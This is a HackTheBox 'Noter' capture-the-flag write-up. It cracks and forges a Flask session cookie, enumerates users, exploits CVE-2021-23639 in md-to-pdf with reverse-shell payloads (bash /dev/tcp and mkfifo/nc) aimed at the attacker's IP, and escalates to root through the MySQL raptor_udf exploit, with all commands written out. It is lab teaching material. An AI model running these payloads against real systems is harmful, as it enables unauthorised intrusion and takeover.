#### HTB: Noter

**Recon (nmap):**

```
Nmap scan report for 10.10.11.160  
Host is up (0.016s latency).  
Not shown: 997 closed ports  
PORT     STATE SERVICE VERSION  
21/tcp   open  ftp     vsftpd 3.0.3  
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)  
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10  
|_http-title: Noter  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```

We see three services open, and we can pretty much ignore SSH for now, as we don't have any credentials. The web server running Python is something I take note (rimshot) of for later. 

We can try poking at FTP, but this requires credentials: 
```
Connected to 10.10.11.160.  
220 (vsFTPd 3.0.3)  
Name (10.10.11.160:th3hat3d): anonymous  
331 Please specify the password.  
Password:  
530 Login incorrect.  
Login failed.
```

**Looking at the Web App**

![noterlanding](https://th3hat3d.github.io/img/noterlanding.png)

We see that this is a note taking application, and we can register an account. 

Since we can take notes, we can try XSS, but it seems like there's protection against it:

![noterxss](https://th3hat3d.github.io/img/noterxss.png)

I look at my cookies, and the session cookie looks like a JWT:
```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGhlaGF0ZWQifQ.YxdlLA._lcrtN-DCCQh4qMis3XX-5YZG_o
```

Opening it in JWT.io, the header looks good, but the payload looks off:

```
{
  "logged_in": true,
  "username": "thehated"
}
```

```
"c\u0017e,"
```

Knowing that this web server is running Python, it's possible that this is a Flask session cookie, as Python websites are often built with Flask.

A tool called flask-unsign will help us here. It deals with Flask cookies and will even try to brute force the signing secret. We can put our cookie in, and it cracks:

```
thehated@debian:~$ flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGhlaGF0ZWQifQ.YxdlLA._lcrtN-DCCQh4qMis3XX-5YZG_o" --no-literal-eval --wordlist ~/SecLists/Passwords/Leaked-Databases/rockyou.txt

[*] Session decodes to: {'logged_in': True, 'username': 'thehated'}  
[*] Starting brute-forcer with 8 threads..  
[+] Found secret key after 17152 attempts  
b'secret123'
```

But we don't have a username. Luckily, we can enumerate users at the sign in page. If I enter a wrong username:
![noterwronguser](https://th3hat3d.github.io/img/noterwronguser.png)

But if we enter a correct username:
![noterrightuser](https://th3hat3d.github.io/img/noterrightuser.png)

There is a different message for a valid user and wrong password.

We can enumerate valid users with ffuf and we find one pretty quick:
```
thehated@debian:~$ ffuf -u http://10.10.11.160:5000/login --data "username=FUZZ&password=Noter" -H 'Content-Type: application/x-www-form-urlencoded' -w ~/SecLists/Usernames/xato-net-10-million-usernames.txt -mr "Invalid login"

       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.1.0  
________________________________________________  
  
:: Method           : POST  
:: URL              : http://10.10.11.160:5000/login  
:: Wordlist         : FUZZ: /home/thedoug/SecLists/Usernames/xato-net-10-million-usernames.txt  
:: Header           : Content-Type: application/x-www-form-urlencoded  
:: Data             : username=FUZZ&password=Noter  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Regexp: Invalid login  
________________________________________________  
  
blue                    [Status: 200, Size: 2027, Words: 432, Lines: 69]
```

**Forging the Cookie and Logging in as Blue**

Using flask-unsign, we can also sign a cookie:
```
thehated@debian:~$ flask-unsign --sign --secret secret123 --cookie "{'logged_in': True, 'username': 'blue'}"
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yxds9g.fR2IP9wZhjGqa5LnmiegvwDGKJ0
```

Upon changing our cookie, we get signed in as Blue:
![noterloggedin](https://th3hat3d.github.io/img/noterloggedin.png)

Crucially, we have a note from ftp_admin:

![noternote](https://th3hat3d.github.io/img/noternote.png)

Now we can log in to FTP.

**Enumerating FTP**

Logging into FTP as blue, we see a file named "policy.pdf", and download it:
```
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files  
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
```

The "files" directory is empty.

The pdf gives us info about passwords:
![noterpdf](https://th3hat3d.github.io/img/noterpdf.png)

Most crucially, it tells us that the password format is "username@site_name!", and since blue's password was "blue@Noter!", perhaps ftp_admin's password is "ftp_admin@Noter!"

**RCE and shell as svc**

We see two app backups:
```
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip  
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip  
226 Directory send OK.
```

We download these and look at them. They are backups of the web app, and one of them has a database password, which might be useful later:
```
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

There is an md-to-pdf function in the backup, and we can see this on the web app too:
![noterexport](https://th3hat3d.github.io/img/noterexport.png)

Looking for exploits in md-to-pdf, we see a poc script for CVE-2021-23639:
![noterpoc](https://th3hat3d.github.io/img/noterpoc.png)

There is an error in the poc, "jsn" should be "js\\n". Since we can export directly from the cloud, we can host the poc and have it downloaded by the web app. My payload:
```
---js\n((require("child_process")).execSync("bash -c 'bash -i >& /dev/tcp/10.10.16.14/1337 0>&1'"))\n---RCE
```

After we export from cloud on the web app, we look at nc:
```
thehated@debian:~$ nc -lnvp 1337  
listening on [any] 1337 ...  
connect to [10.10.16.14] from (UNKNOWN) [10.10.11.160] 50624  
/bin/bash: 1"))\n---RCE: ambiguous redirect
```

The problem with the payload is the ambigious redirects that it has, as indicated by the error message. A reverse shell better suited for this would be the classic mkfifo shell, so we'll try that:
```
---js\n((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.14 1337 >/tmp/f"))\n---RCE
```

And at nc, it works:
```
listening on [any] 1337 ...  
connect to [10.10.16.14] from (UNKNOWN) [10.10.11.160] 50710  
sh: 0: can't access tty; job control turned off  
$
```

And we can grab user.txt here too:
```
svc@noter:~$ ls  
app  user.txt  
svc@noter:~$
```
**Privilege Escalation: svc to root**

Running, linpeas, we see something dangerous:
```
╔══════════╣ MySQL                                                                                                                                                                 
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                                          
MySQL user: root                                                                                                                                                                   
                                                                                                                                                                                  
═╣ MySQL connection using default root/root ........... No                                                                                                                         
═╣ MySQL connection using root/toor ................... No                                                                                                                         
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                         
                                                                                                                                                                                  
╔══════════╣ Searching mysql credentials and exec                                                                                                                                  
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = root
```

MySQL is running as root, and not as the mysql user. This is vulnerable to the raptor_udf exploit, which can be found [here](https://www.exploit-db.com/exploits/1518).

First, we compile the exploit:
```
svc@noter:~$ gcc -g -c raptor_udf2.c  
svc@noter:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc  
svc@noter:~$ ls  
app  linpeas.sh  raptor_udf2.c  raptor_udf2.o  raptor_udf2.so  user.txt  
svc@noter:~$
```

Those database creds from earlier come in handy here, as we need to be the root user to pull off this exploit:
```
mysql -u root -pNildogg36  
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 7074  
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04  
  
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
  
MariaDB [(none)]>
```

In the raptor exploit code, it assumes that the plugins directory is /usr/lib:
```
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
```

But this is not the case here:
```
MariaDB [(none)]> show variables like '%plugin%';    
+-----------------+---------------------------------------------+  
| Variable_name   | Value                                       |  
+-----------------+---------------------------------------------+  
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |  
| plugin_maturity | gamma                                       |  
+-----------------+---------------------------------------------+  
2 rows in set (0.001 sec)  
  
MariaDB [(none)]>
```

Knowing this, we pull off the exploit:
```
MariaDB [(none)]> use mysql;  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
MariaDB [mysql]> create table foo(line blob);  
Query OK, 0 rows affected (0.009 sec)  
  
MariaDB [mysql]> insert into foo values(load_file('/home/svc/raptor_udf2.so'));      
Query OK, 1 row affected (0.002 sec)  
  
MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';  
Query OK, 1 row affected (0.001 sec)  
  
MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';  
Query OK, 0 rows affected (0.001 sec)  
  
MariaDB [mysql]> select * from mysql.func;  
+-----------+-----+----------------+----------+  
| name      | ret | dl             | type     |  
+-----------+-----+----------------+----------+  
| do_system |   2 | raptor_udf2.so | function |  
+-----------+-----+----------------+----------+  
1 row in set (0.001 sec)  
  
MariaDB [mysql]> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');  
+----------------------------------------------------------+  
| do_system('id > /tmp/out; chown raptor.raptor /tmp/out') |  
+----------------------------------------------------------+  
|                                                        0 |  
+----------------------------------------------------------+  
1 row in set (0.009 sec)  
  
MariaDB [mysql]> \! sh  
$ cat /tmp/out  
cat: /tmp/out: Permission denied  
$ ls -l /tmp/out  
-rw-rw---- 1 root root 39 Sep  6 18:25 /tmp/out  
$
```

We can see that /tmp/out was written, and that it is, indeed owned by root. This proves that we have command execution as root. Doing a reverse shell:
```
MariaDB [mysql]> create table foo(line blob);  
Query OK, 0 rows affected (0.007 sec)  
  
MariaDB [mysql]> insert into foo values(load_file('/home/svc/raptor_udf2.so'));  
Query OK, 1 row affected (0.002 sec)  
  
MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';  
Query OK, 1 row affected (0.001 sec)  
  
MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';  
Query OK, 0 rows affected (0.000 sec)  
  
MariaDB [mysql]> select do_system("bash -c 'bash -i >& /dev/tcp/10.10.16.14/1337 0>&1");  
+-----------------------------------------------------------------+  
| do_system("bash -c 'bash -i >& /dev/tcp/10.10.16.14/1337 0>&1") |  
+-----------------------------------------------------------------+  
|                                                               0 |  
+-----------------------------------------------------------------+  
1 row in set (0.002 sec)  
  
MariaDB [mysql]> select do_system("bash -c 'bash -i >& /dev/tcp/10.10.16.14/1337 0>&1'");

```

Slight hiccup on my part, but after correcting my mistake, it hangs, and at nc:
```
listening on [any] 1337 ...  
connect to [10.10.16.14] from (UNKNOWN) [10.10.11.160] 51128  
bash: cannot set terminal process group (962): Inappropriate ioctl for device  
bash: no job control in this shell  
root@noter:/var/lib/mysql#
```

We're root!